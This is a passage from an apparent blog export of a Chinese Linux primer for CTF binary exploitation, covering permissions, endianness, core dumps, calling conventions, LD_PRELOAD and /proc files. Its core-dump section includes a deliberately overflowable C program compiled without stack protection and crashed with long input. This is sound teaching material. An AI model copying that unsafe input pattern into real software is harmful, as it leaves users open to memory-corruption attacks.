命令则可以切换到一个不同的用户：\n\n```\n$ whoami\nfirmy\n$ su root\n# whoami\nroot\n```\n\n`whoami` 用于打印当前有效的用户名称，shell 中普通用户以 `$` 开头，root 用户以 `#` 开头。在输入密码后，我们已经从 firmy 用户转换到 root 用户了。\n\n\n\n## 权限设置\n\n在Linux 中，文件或目录权限的控制分别以读取、写入、执行 3 种一般权限来区分，另有 3 种特殊权限可供运用。\n\n使用 `ls -l [file]` 来查看某文件或目录的信息：\n\n```\n$ ls -l /\nlrwxrwxrwx   1 root root     7 Jun 21 22:44 bin -> usr/bin\ndrwxr-xr-x   4 root root  4096 Jul 28 08:48 boot\n-rw-r--r--   1 root root 18561 Apr  2 22:48 desktopfs-pkgs.txt\n```\n\n第一栏从第二个字母开始就是权限字符串，权限表示三个为一组，依次是所有者权限、组权限、其他人权限。每组的顺序均为 `rwx`，如果有相应权限，则表示成相应字母，如果不具有相应权限，则用 `-` 表示。 - `r`：读取权限，数字代号为 “4” - `w`：写入权限，数字代号为 “2” - `x`：执行或切换权限，数字代号为 “1”\n\n\n\n通过第一栏的第一个字母可知，第一行是一个链接文件 （`l`），第二行是个目录（`d`），第三行是个普通文件（`-`）。\n\n用户可以使用 `chmod` 指令去变更文件与目录的权限。权限范围被指定为所有者（`u`）、所属组（`g`）、其他人（`o`）和所有人（`a`）。 - -R：递归处理，将指令目录下的所有文件及子目录一并处理； - <权限范围>+<权限设置>：开启权限范围的文件或目录的该选项权限设置 - `$ chmod a+r [file]`：赋予所有用户读取权限 - <权限范围>-<权限设置>：关闭权限范围的文件或目录的该选项权限设置 - `$ chmod u-w [file]`：取消所有者写入权限 - <权限范围>=<权限设置>：指定权限范围的文件或目录的该选项权限设置； - `$ chmod g=x [file]`：指定组权限为可执行 - `$ chmod o=rwx [file]`：制定其他人权限为可读、可写和可执行\n\n![img](http://study.ctfcaict.com/media/course/html/3/site/linux/pic/1.3_file.png)\n\n## 字节序\n\n目前计算机中采用两种字节存储机制：大端（Big-endian）和小端（Little-endian）。\n\n> MSB (Most Significan Bit/Byte)：最重要的位或最重要的字节。\n>\n> LSB (Least Significan Bit/Byte)：最不重要的位或最不重要的字节。\n\nBig-endian 规定 MSB 在存储时放在低地址，在传输时放在流的开始；LSB  存储时放在高地址，在传输时放在流的末尾。Little-endian 则相反。常见的 Intel 处理器使用 Little-endian，而  PowerPC 系列处理器则使用 Big-endian，另外 TCP/IP 协议和 Java 虚拟机的字节序也是 Big-endian。\n\n例如十六进制整数 0x12345678 存入以 1000H 开始的内存中：\n\n![img](http://study.ctfcaict.com/media/course/html/3/site/linux/pic/1.3_byte_order.png)\n\n我们在内存中实际地看一下，在地址 `0xffffd584` 处有字符 `1234`，在地址 `0xffffd588` 处有字符 `5678`。\n\n```\ngdb-peda$ x/w 0xffffd584\n0xffffd584:     0x34333231\ngdb-peda$ x/4wb 0xffffd584\n0xffffd584:     0x31    0x32    0x33    0x34\ngdb-peda$ python print('\\x31\\x32\\x33\\x34')\n1234\n\ngdb-peda$ x/w 0xffffd588\n0xffffd588:     0x38373635\ngdb-peda$ x/4wb 0xffffd588\n0xffffd588:     0x35    0x36    0x37    0x38\ngdb-peda$ python print('\\x35\\x36\\x37\\x38')\n5678\n\ngdb-peda$ x/2w 0xffffd584\n0xffffd584:     0x34333231      0x38373635\ngdb-peda$ x/8wb 0xffffd584\n0xffffd584:     0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38\ngdb-peda$ python print('\\x31\\x32\\x33\\x34\\x35\\x35\\x36\\x37\\x38')\n123455678\ndb-peda$ x/s 0xffffd584\n0xffffd584:     \"12345678\"\n```\n\n\n\n## 输入输出\n\n- 使用命令的输出作为可执行文件的输入参数\n- `$ ./vulnerable 'your_command_here'`\n- `$ ./vulnerable $(your_command_here)`\n- 使用命令作为输入\n- `$ your_command_here | ./vulnerable`\n- 将命令行输出写入文件\n- `$ your_command_here > filename`\n- 使用文件作为输入\n- `$ ./vulnerable < filename`\n\n## 文件描述符\n\n在 Linux 系统中一切皆可以看成是文件，文件又分为：普通文件、目录文件、链接文件和设备文件。文件描述符（file descriptor）是内核管理已被打开的文件所创建的索引，使用一个非负整数来指代被打开的文件。\n\n标准文件描述符如下：\n\n| 文件描述符 | 用途     | stdio 流 |\n| ---------- | -------- | -------- |\n| 0          | 标准输入 | stdin    |\n| 1          | 标准输出 | stdout   |\n| 2          | 标准错误 | stderr   |\n\n当一个程序使用 `fork()` 生成一个子进程后，子进程会继承父进程所打开的文件表，此时，父子进程使用同一个文件表，这可能导致一些安全问题。如果使用 `vfork()`，子进程虽然运行于父进程的空间，但拥有自己的进程表项。\n\n## 核心转储\n\n当程序运行的过程中异常终止或崩溃，操作系统会将程序当时的内存、寄存器状态、堆栈指针、内存管理信息等记录下来，保存在一个文件中，这种行为就叫做核心转储（Core Dump）。\n\n#### 会产生核心转储的信号\n\n| Signal  | Action | Comment                  |\n| ------- | ------ | ------------------------ |\n| SIGQUIT | Core   | Quit from keyboard       |\n| SIGILL  | Core   | Illegal Instruction      |\n| SIGABRT | Core   | Abort signal from abort  |\n| SIGSEGV | Core   | Invalid memory reference |\n| SIGTRAP | Core   | Trace/breakpoint trap    |\n\n#### 开启核心转储\n\n- 输入命令 `ulimit -c`，输出结果为 `0`，说明默认是关闭的。\n\n- 输入命令 `ulimit -c unlimited` 即可在当前终端开启核心转储功能。\n\n- 如果想让核心转储功能永久开启，可以修改文件 \n\n  ```\n  /etc/security/limits.conf\n  ```\n\n  ，增加一行：  \n\n  ```\n  #<domain>      <type>  <item>         <value>\n  *               soft    core            unlimited\n  ```\n\n#### 修改转储文件保存路径\n\n- ```\n  /proc/sys/kernel/core_uses_pid\n  ```\n\n  ，可以使生成的核心转储文件名变为 \n\n  ```\n  core.[pid]\n  ```\n\n   的模式。  \n\n  ```\n  # echo 1 > /proc/sys/kernel/core_uses_pid\n  ```\n\n- 还可以修改 \n\n  ```\n  /proc/sys/kernel/core_pattern\n  ```\n\n   来控制生成核心转储文件的保存位置和文件名格式。  \n\n  ```\n  # echo /tmp/core-%e-%p-%t > /proc/sys/kernel/core_pattern\n  ```\n\n    此时生成的文件保存在 \n\n  ```\n  /tmp/\n  ```\n\n   目录下，文件名格式为 \n\n  ```\n  core-[filename]-[pid]-[time]\n  ```\n\n#### 使用 gdb 调试核心转储文件\n\n```\n$ gdb [filename] [core file]\n```\n\n#### 例子\n\n```\n$ cat core.c\n#include <stdio.h>\nvoid main(int argc, char **argv) {\n    char buf[5];\n    scanf(\"%s\", buf);\n}\n$ gcc -m32 -fno-stack-protector core.c\n$ ./a.out\nAAAAAAAAAAAAAAAAAAAA\nSegmentation fault (core dumped)\n$ file /tmp/core-a.out-12444-1503198911\n/tmp/core-a.out-12444-1503198911: ELF 32-bit LSB core file Intel 80386, version 1 (SYSV), SVR4-style, from './a.out', real uid: 1000, effective uid: 1000, real gid: 1000, effective gid: 1000, execfn: './a.out', platform: 'i686'\n$ gdb a.out /tmp/core-a.out-12444-1503198911 -q\nReading symbols from a.out...(no debugging symbols found)...done.\n[New LWP 12444]\nCore was generated by `./a.out'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x5655559b in main ()\ngdb-peda$ info frame\nStack level 0, frame at 0x41414141:\n eip = 0x5655559b in main; saved eip = <not saved>\n Outermost frame: Cannot access memory at address 0x4141413d\n Arglist at 0x41414141, args:\n Locals at 0x41414141, Previous frame's sp is 0x41414141\nCannot access memory at address 0x4141413d\n```\n\n## 调用约定\n\n函数调用约定是对函数调用时如何传递参数的一种约定。关于它的约定有许多种，下面我们分别从内核接口和用户接口介绍 32 位和 64 位 Linux 的调用约定。\n\n#### 内核接口\n\n**x86-32 系统调用约定**：Linux 系统调用使用寄存器传递参数。`eax` 为 syscall_number，`ebx`、`ecx`、`edx`、`esi`、`ebp` 用于将 6 个参数传递给系统调用。返回值保存在 `eax` 中。所有其他寄存器（包括 EFLAGS）都保留在 `int 0x80` 中。\n\n**x86-64 系统调用约定**：内核接口使用的寄存器有：`rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9`。系统调用通过 `syscall` 指令完成。除了 `rcx`、`r11` 和 `rax`，其他的寄存器都被保留。系统调用的编号必须在寄存器 `rax` 中传递。系统调用的参数限制为 6 个，不直接从堆栈上传递任何参数。返回时，`rax` 中包含了系统调用的结果。而且只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。\n\n#### 用户接口\n\n**x86-32 函数调用约定**：参数通过栈进行传递。最后一个参数第一个被放入栈中，直到所有的参数都放置完毕，然后执行 call 指令。这也是 Linux 上 C 语言函数的方式。\n\n**x86-64 函数调用约定**：x86-64 下通过寄存器传递参数，这样做比通过栈有更高的效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数的类型是 MEMORY，则在栈上传递参数。如果类型是 INTEGER，则顺序使用 `rdi`、`rsi`、`rdx`、`rcx`、`r8` 和 `r9`。所以如果有多于 6 个的 INTEGER 参数，则后面的参数在栈上传递。\n\n## 环境变量\n\n- 按照生命周期划分\n- 永久环境变量：修改相关配置文件，永久生效。\n- 临时环境变量：使用 `export` 命令，在当前终端下生效，关闭终端后失效。\n- 按照作用域划分\n- 系统环境变量：对该系统中所有用户生效。\n- 用户环境变量：对特定用户生效。\n\n#### 设置方法\n\n1. 在文件 `/etc/profile` 中添加变量，这种方法对所有用户永久生效。如：\n\n   ```\n   # Set our default path\n   PATH=\"/usr/local/sbin:/usr/local/bin:/usr/bin\"\n   export PATH\n   ```\n\n   添加后执行命令 \n\n   ```\n   source /etc/profile\n   ```\n\n    使其生效。\n\n   \n\n2. 在文件 `~/.bash_profile` 中添加变量，这种方法对当前用户永久生效。其余同上。\n\n3. 直接运行命令 `export` 定义变量，这种方法只对当前终端临时生效。\n\n#### 常用变量\n\n使用命令 `echo` 打印变量：\n\n```\n$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl\n$ echo $HOME\n/home/firmy\n$ echo $LOGNAME\nfirmy\n$ echo $HOSTNAME\nfirmy-pc\n$ echo $SHELL\n/bin/bash\n$ echo $LANG\nen_US.UTF-8\n```\n\n使用命令 `env` 可以打印出所有环境变量：\n\n```\n$ env\n```\n\n使用命令 `set` 可以打印处所有本地定义的 shell 变量：\n\n```\n$ set\n```\n\n使用命令 `unset` 可以清楚环境变量：\n\n```\n$ unset $变量名\n```\n\n\n\n#### LD_PRELOAD\n\n该环境变量可以定义在程序运行前优先加载的动态链接库。在 pwn 题目中，我们可能需要一个特定的 libc，这时就可以定义该变量：\n\n```\n$ LD_PRELOAD=/path/to/libc.so ./binary\n```\n\n一个例子：\n\n```\n$ ldd /bin/true\n    linux-vdso.so.1 =>  (0x00007fff9a9fe000)\n    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1c083d9000)\n    /lib64/ld-linux-x86-64.so.2 (0x0000557bcce6c000)\n$ LD_PRELOAD=~/libc.so.6 ldd /bin/true\n    linux-vdso.so.1 =>  (0x00007ffee55e9000)\n    /home/firmy/libc.so.6 (0x00007f4a28cfc000)\n    /lib64/ld-linux-x86-64.so.2 (0x000055f33bc50000)\n```\n\n\n\n注意，这种方法得根据实际情况来用，大概就是使用的发行版要相同（`interpreter` 相同），上面的例子中两个 libc 是这样的：\n\n```\n$ file /lib/x86_64-linux-gnu/libc-2.23.so\n/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped\n$ file ~/libc.so.6\n/home/firmy/libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped\n```\n\n都是 `interpreter /lib64/ld-linux-x86-64.so.2`，所以可以替换。\n\n\n\n而下面的例子是在 Arch Linux 上使用一个 Ubuntu 的 libc，就会出错：\n\n```\n$ ldd /bin/true\n        linux-vdso.so.1 (0x00007ffc969df000)\n        libc.so.6 => /usr/lib/libc.so.6 (0x00007f7ddde17000)\n        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f7dde3d7000)\n$ LD_PRELOAD=~/libc.so.6 ldd /bin/true\nIllegal instruction (core dumped)\n$ file /usr/lib/libc-2.26.so\n/usr/lib/libc-2.26.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /usr/lib/ld-linux-x86-64.so.2, BuildID[sha1]=458fd9997a454786f071cfe2beb234542c1e871f, for GNU/Linux 3.2.0, not stripped\n$ file ~/libc.so.6\n/home/firmy/libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped\n```\n\n一个在 `interpreter /usr/lib/ld-linux-x86-64.so.2`，而另一个在 `interpreter /lib64/ld-linux-x86-64.so.2`。\n\n\n\n## /proc/pid\n\nproc 文件系统是 Linux 内核提供的，为访问系统内核数据的操作提供接口。在该文件系统下，有一些以数字命名的目录，这些数字是进程的 PID 号，而这些目录是进程目录。\n\n目录下的所有文件如下，然后会介绍几个比较重要的：\n\n```\n$ cat - &\n[1] 2865\n$ ls /proc/2865/\nattr             cpuset   limits      ns             root          statm\nautogroup        cwd      map_files   numa_maps      sched         status\nauxv             environ  maps        oom_adj        schedstat     syscall\ncgroup           exe      mem         oom_score      setgroups     task\nclear_refs       fd       mountinfo   oom_score_adj  smaps         timers\ncmdline          fdinfo   mounts      pagemap        smaps_rollup  timerslack_ns\ncomm             gid_map  mountstats  personality    stack         uid_map\ncoredump_filter  io       net         projid_map     stat          wchan\n\n[1]+  Stopped                 cat -\n```\n\n\n\n#### /proc/[pid]/maps\n\n这个文件大概是最常用的，用于显示进程的内存区域映射信息：\n\n```\n$ cat /proc/2865/maps\n5580631c6000-5580631ce000 r-xp 00000000 08:01 4981196                    /usr/bin/cat\n5580633cd000-5580633ce000 r--p 00007000 08:01 4981196                    /usr/bin/cat\n5580633ce000-5580633cf000 rw-p 00008000 08:01 4981196                    /usr/bin/cat\n558063c7d000-558063c9e000 rw-p 00000000 00:00 0                          [heap]\n7f6301cd7000-7f6302027000 r--p 00000000 08:01 4993768                    /usr/lib/locale/locale-archive\n7f6302027000-7f63021d5000 r-xp 00000000 08:01 4982395                    /usr/lib/libc-2.26.so\n7f63021d5000-7f63023d5000 ---p 001ae000 08:01 4982395                    /usr/lib/libc-2.26.so\n7f63023d5000-7f63023d9000 r--p 001ae000 08:01 4982395                    /usr/lib/libc-2.26.so\n7f63023d9000-7f63023db000 rw-p 001b2000 08:01 4982395                    /usr/lib/libc-2.26.so\n7f63023db000-7f63023df000 rw-p 00000000 00:00 0\n7f63023df000-7f6302404000 r-xp 00000000 08:01 4982398                    /usr/lib/ld-2.26.so\n7f63025c1000-7f63025c3000 rw-p 00000000 00:00 0\n7f63025e1000-7f6302603000 rw-p 00000000 00:00 0\n7f6302603000-7f6302604000 r--p 00024000 08:01 4982398                    /usr/lib/ld-2.26.so\n7f6302604000-7f6302605000 rw-p 00025000 08:01 4982398                    /usr/lib/ld-2.26.so\n7f6302605000-7f6302606000 rw-p 00000000 00:00 0\n7fff2ab81000-7fff2aba2000 rw-p 00000000 00:00 0                          [stack]\n7fff2abef000-7fff2abf2000 r--p 00000000 00:00 0                          [vvar]\n7fff2abf2000-7fff2abf4000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n```\n\n\n\n#### /proc/[pid]/stack\n\n这个文件表示当前进程的内核调用栈信息：\n\n```\n$ sudo cat /proc/2865/stack\n[<ffffffffa008d05e>] do_signal_stop+0xae/0x1f0\n[<ffffffffa008e50c>] get_signal+0x18c/0x5a0\n[<ffffffffa002ac26>] do_signal+0x36/0x610\n[<ffffffffa0003019>] exit_to_usermode_loop+0x69/0xa0\n[<ffffffffa00038eb>] syscall_return_slowpath+0x9b/0xb0\n[<ffffffffa06926e4>] entry_SYSCALL_64_fastpath+0x7b/0x7d\n[<ffffffffffffffff>] 0xffffffffffffffff\n```\n\n\n\n#### /proc/[pid]/auxv\n\n该文件包含了传递给进程的解释器信息，即 auxv(AUXiliary Vector)，每一项都是由一个 unsigned long 长度的 ID 加上一个 unsigned long 长度的值构成：\n\n```\n$ xxd -e -g8 /proc/2865/auxv\n00000000: 0000000000000021 00007fff2abf2000  !........ .*....\n00000010: 0000000000000010 00000000bfebfbff  ................\n00000020: 0000000000000006 0000000000001000  ................\n00000030: 0000000000000011 0000000000000064  ........d.......\n00000040: 0000000000000003 00005580631c6040  ........@`.c.U..\n00000050: 0000000000000004 0000000000000038  ........8.......\n00000060: 0000000000000005 0000000000000009  ................\n00000070: 0000000000000007 00007f63023df000  ..........=.c...\n00000080: 0000000000000008 0000000000000000  ................\n00000090: 0000000000000009 00005580631c8290  ...........c.U..\n000000a0: 000000000000000b 00000000000003e8  ................\n000000b0: 000000000000000c 00000000000003e8  ................\n000000c0: 000000000000000d 00000000000003e8  ................\n000000d0: 000000000000000e 00000000000003e8  ................\n000000e0: 0000000000000017 0000000000000000  ................\n000000f0: 0000000000000019 00007fff2ab9ff39  ........9..*....\n00000100: 000000000000001a 0000000000000000  ................\n00000110: 000000000000001f 00007fff2aba1feb  ...........*....\n00000120: 000000000000000f 00007fff2ab9ff49  ........I..*....\n00000130: 0000000000000000 0000000000000000  ................\n```\n\n每个值具体是做什么的，可以用下面的办法显示出来，对比看一看，更详细的可以查看 `/usr/include/elf.h` 和 `man ld.so`：\n\n```\n$ LD_SHOW_AUXV=1 cat -\nAT_SYSINFO_EHDR: 0x7fff6afb3000\nAT_HWCAP:        bfebfbff\nAT_PAGESZ:       4096\nAT_CLKTCK:       100\nAT_PHDR:         0x557b68217040\nAT_PHENT:        56\nAT_PHNUM:        9\nAT_BASE:         0x7f41e5689000\nAT_FLAGS:        0x0\nAT_ENTRY:        0x557b68219290\nAT_UID:          1000\nAT_EUID:         1000\nAT_GID:          1000\nAT_EGID:         1000\nAT_SECURE:       0\nAT_RANDOM:       0x7fff6aedc0a9\nAT_HWCAP2:       0x0\nAT_EXECFN:       /usr/bin/cat\nAT_PLATFORM:     x86_64\n```\n\n值得一提的是，`AT_SYSINFO_EHDR` 所对应的值是一个叫做的 VDSO(Virtual Dynamic Shared Object) 的地址。在 ret2vdso 漏洞利用方法中会用到（参考章节6.1.6）。\n\n\n\n#### /proc/[pid]/environ\n\n该文件包含了进程的环境变量：\n\n```\n$ strings /proc/2865/environ\n```\n\n\n\n#### /proc/[pid]/fd\n\n该文件包含了进程打开文件的情况：\n\n```\n$ ls -al /proc/2865/fd\ntotal 0\ndr-x------ 2 firmy firmy  0 12月 30 11:13 .\ndr-xr-xr-x 9 firmy firmy  0 12月 30 11:13 ..\nlrwx------ 1 firmy firmy 64 12月 30 12:31 0 -> /dev/pts/2\nlrwx------ 1 firmy firmy 64 12月 30 12:31 1 -> /dev/pts/2\nlrwx------ 1 firmy firmy 64 12月 30 12:31 2 -> /dev/pts/2\n```\n\n\n\n#### /proc/[pid]/status[¶](http://study.ctfcaict.com/media/course/html/3/863846a6-3305-4770-9bb5-ecaa12171a2e.html#procpidstatus)\n\n该文件包含了进程的状态信息：\n\n```\n$ cat /proc/2865/status\nName:   cat\nUmask:  0022\nState:  T (stopped)\nTgid:   2865\nNgid:   0\nPid:    2865\nPPid:   2059\nTracerPid:      0\nUid:    1000    1000    1000    1000\nGid:    1000    1000    1000    1000\nFDSize: 256\nGroups: 3 7 10 56 90 91 93 95 96 98 1000\nNStgid: 2865\nNSpid:  2865\nNSpgid: 2865\nNSsid:  2059\nVmPeak:     7828 kB\nVmSize:     7828 kB\nVmLck:         0 kB\nVmPin:         0 kB\nVmHWM:       788 kB\nVmRSS:       788 kB\nRssAnon:              64 kB\nRssFile:             724 kB\nRssShmem:              0 kB\nVmData:      312 kB\nVmStk:       132 kB\nVmExe:        32 kB\nVmLib:      1876 kB\nVmPTE:        40 kB\nVmPMD:        12 kB\nVmSwap:        0 kB\nHugetlbPages:          0 kB\nThreads:        1\nSigQ:   2/47723\nSigPnd: 0000000000000000\nShdPnd: 0000000000000000\nSigBlk: 0000000000000000\nSigIgn: 0000000000000000\nSigCgt: 0000000000000000\nCapInh: 0000000000000000\nCapPrm: 0000000000000000\nCapEff: 0000000000000000\nCapBnd: 0000003fffffffff\nCapAmb: 0000000000000000\nNoNewPrivs:     0\nSeccomp:        0\nCpus_allowed:   ff\nCpus_allowed_list:      0-7\nMems_allowed:   00000001\nMems_allowed_list:      0\nvoluntary_ctxt_switches:        1\nnonvoluntary_ctxt_switches:     0\n```\n\n#### /proc/[pid]/syscall\n\n该文件包含了进程正在执行的系统调用：\n\n```\n$ sudo cat /proc/2865/syscall\n0 0x0 0x7f63025e2000 0x20000 0x22 0xffffffffffffffff 0x0 0x7fff2ab9f958 0x7f630210ea11\n```\n\n第一个值是系统调用号，后面跟着是六个参数，最后两个值分别是堆栈指针和指令计数器的值。","slug":"linux1","published":1,"date":"2021-06-24T12:23:16.285Z","updated":"2021-06-24T12:43:35.691Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n9u0009rouve6vz3dpj","content":"<h1 id=\"Linux快速入门\"><a href=\"#Linux快速入门\" class=\"headerlink\" title=\"Linux快速入门\"></a>Linux快速入门</h1><h2 id=\"常用基础命令\"><a href=\"#常用基础命令\" class=\"headerlink\" title=\"常用基础命令\"></a>常用基础命令</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls                  用来显示目标列表</span><br><span class=\"line\"></span><br><span class=\"line\">cd [path]           用来切换工作目录</span><br><span class=\"line\"></span><br><span class=\"line\">pwd                 以绝对路径的方式显示用户当前工作目录</span><br><span class=\"line\"></span><br><span class=\"line\">man [command]       查看Linux中的指令帮助、配置文件帮助和编程帮助等信息</span><br><span class=\"line\"></span><br><span class=\"line\">apropos [whatever]  在一些特定的包含系统命令的简短描述的数据库文件里查找关键字</span><br><span class=\"line\"></span><br><span class=\"line\">echo [string]       打印一行文本，参数“-e”可激活转义字符</span><br><span class=\"line\"></span><br><span class=\"line\">cat [file]          连接文件并打印到标准输出设备上</span><br><span class=\"line\"></span><br><span class=\"line\">less [file]         允许用户向前或向后浏览文字档案的内容</span><br><span class=\"line\"></span><br><span class=\"line\">mv [file1] [file2]  用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中</span><br><span class=\"line\"></span><br><span class=\"line\">cp [file1] [file2]  用来将一个或多个源文件或者目录复制到指定的目的文件或目录</span><br><span class=\"line\"></span><br><span class=\"line\">rm [file]           可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉</span><br><span class=\"line\"></span><br><span class=\"line\">ps                  用于报告当前系统的进程状态</span><br><span class=\"line\"></span><br><span class=\"line\">top                 实时查看系统的整体运行情况</span><br><span class=\"line\"></span><br><span class=\"line\">kill                杀死一个进程</span><br><span class=\"line\"></span><br><span class=\"line\">ifconfig            查看或设置网络设备</span><br><span class=\"line\"></span><br><span class=\"line\">ping                查看网络上的主机是否工作</span><br><span class=\"line\"></span><br><span class=\"line\">netstat             显示网络连接、路由表和网络接口信息</span><br><span class=\"line\"></span><br><span class=\"line\">nc(netcat)          建立 TCP 和 UDP 连接并监听</span><br><span class=\"line\"></span><br><span class=\"line\">su                  切换当前用户身份到其他用户身份</span><br><span class=\"line\"></span><br><span class=\"line\">touch [file]        创建新的空文件</span><br><span class=\"line\"></span><br><span class=\"line\">mkdir [dir]         创建目录</span><br><span class=\"line\"></span><br><span class=\"line\">chmod               变更文件或目录的权限</span><br><span class=\"line\"></span><br><span class=\"line\">chown               变更某个文件或目录的所有者和所属组</span><br><span class=\"line\"></span><br><span class=\"line\">nano / vim / emacs  字符终端的文本编辑器</span><br><span class=\"line\"></span><br><span class=\"line\">exit                退出 shell</span><br><span class=\"line\">管道命令符 &quot;|&quot;       将一个命令的标准输出作为另一个命令的标准输入</span><br></pre></td></tr></table></figure>\n\n<p>使用变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var=value         给变量var赋值value</span><br><span class=\"line\"></span><br><span class=\"line\">$var, $&#123;var&#125;      取变量的值</span><br><span class=\"line\"></span><br><span class=\"line\">`cmd`, $(cmd)     代换标准输出</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;string&#x27;          非替换字符串</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;string&quot;          可替换字符串        </span><br><span class=\"line\">$ var=&quot;test&quot;;</span><br><span class=\"line\">$ echo $var</span><br><span class=\"line\">test</span><br><span class=\"line\">$ echo &#x27;This is a $var&#x27;;</span><br><span class=\"line\">This is a $var</span><br><span class=\"line\">$ echo &quot;This is a $var&quot;;</span><br><span class=\"line\">This is a test</span><br><span class=\"line\"></span><br><span class=\"line\">$ echo `date`;</span><br><span class=\"line\">2017年 11月 06日 星期一 14:40:07 CST</span><br><span class=\"line\">$ $(bash)</span><br><span class=\"line\"></span><br><span class=\"line\">$ echo $0</span><br><span class=\"line\">/bin/bash</span><br><span class=\"line\">$ $($0)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Bash-快捷键\"><a href=\"#Bash-快捷键\" class=\"headerlink\" title=\"Bash 快捷键\"></a>Bash 快捷键</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Up(Down)          上（下）一条指令</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + c          终止当前进程</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + z          挂起当前进程，使用“fg”可唤醒</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + d          删除光标处的字符</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + l          清屏</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + a          移动到命令行首</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + e          移动到命令行尾</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + b          按单词后移（向左）</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + f          按单词前移（向右）</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + Shift + c  复制</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + Shift + v  粘贴</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"根目录结构\"><a href=\"#根目录结构\" class=\"headerlink\" title=\"根目录结构\"></a>根目录结构</h2><figure class=\"highlight plaintext\"><table><tr><td 